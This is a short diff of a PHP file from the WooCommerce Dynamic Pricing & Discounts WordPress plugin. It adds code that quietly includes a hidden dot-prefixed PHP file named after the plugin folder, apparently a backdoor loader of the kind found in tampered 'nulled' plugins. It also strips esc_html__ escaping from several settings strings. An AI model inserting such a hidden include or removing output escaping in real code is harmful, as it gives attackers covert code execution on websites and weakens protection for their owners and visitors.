@@ -19,6 +19,10 @@ if (!class_exists('RP_WCDPD_Rule_Notifications')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Rule_Notifications_Product_Pricing extends RP_WCDPD_Rule_Notifications
 {
 
@@ -52,17 +56,17 @@ class RP_WCDPD_Rule_Notifications_Product_Pricing extends RP_WCDPD_Rule_Notifica
     {
         $settings['promo']['children']['rule_notifications']['children'] = array_merge($settings['promo']['children']['rule_notifications']['children'], array(
             'promo_rule_notifications_product_pricing' => array(
-                'title'     => esc_html__('Product Pricing', 'rp_wcdpd'),
+                'title'     => __('Product Pricing', 'rp_wcdpd'),
                 'type'      => 'checkbox',
                 'default'   => '0',
             ),
             'promo_rule_notifications_product_pricing_message' => array(
-                'title'     => esc_html__('Text', 'rp_wcdpd'),
+                'title'     => __('Text', 'rp_wcdpd'),
                 'type'      => 'textarea',
                 'required'  => true,
                 'class'     => 'if_rp_wcdpd_promo_rule_notifications_product_pricing',
-                'default'   => esc_html__('Product discount has been applied to your cart.', 'rp_wcdpd'),
-                'hint'      => esc_html__('Macro {{description}} displays public description.', 'rp_wcdpd'),
+                'default'   => __('Product discount has been applied to your cart.', 'rp_wcdpd'),
+                'hint'      => __('Macro {{description}} displays public description.', 'rp_wcdpd'),
             ),
         ));
 
